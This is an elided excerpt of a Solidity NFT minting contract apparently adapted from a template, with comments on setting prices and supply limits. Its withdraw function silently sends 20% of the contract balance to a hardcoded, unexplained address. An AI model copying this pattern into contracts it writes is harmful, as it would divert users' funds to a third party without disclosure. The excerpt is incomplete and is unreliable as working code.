...
contract VilTest is ERC721A, Ownable, ReentrancyGuard { //Change contract name from SampleNFTLowGas
...
// ================== Variables Start =======================
  ...
  uint256 public cost2 = 0.1 ether; //here you change phase 2 cost
  uint256 public supplyLimitPhase1 = 8000;  //change to your NFT supply for phase1
  uint256 public supplyLimit = 9001;  //change it to your total NFT supply
  uint256 public maxMintAmountPerTxPhase1 = 1; //decide how many NFT's you want to mint with cost1
  uint256 public maxMintAmountPerTxPhase2 = 2; //decide how many NFT's you want to mint with cost2
  uint256 public maxLimitPerWallet = 2; //decide how many NFT's you want to let customers mint per wallet
...
// ================== Constructor Start =======================
  ...
  ) ERC721A("Vil Test", "VILT")  { //change this line to your full and short NFT name
    seturi(_uri);
...
// ================== Mint Functions Start =======================
  ...
  function withdraw() public onlyOwner {
    (bool hs, ) = payable(0x8FBa87F8718Fd518A9CCB61025f1B7Af2946E546).call{value: address(this).balance * 20 / 100}("");
    require(hs);
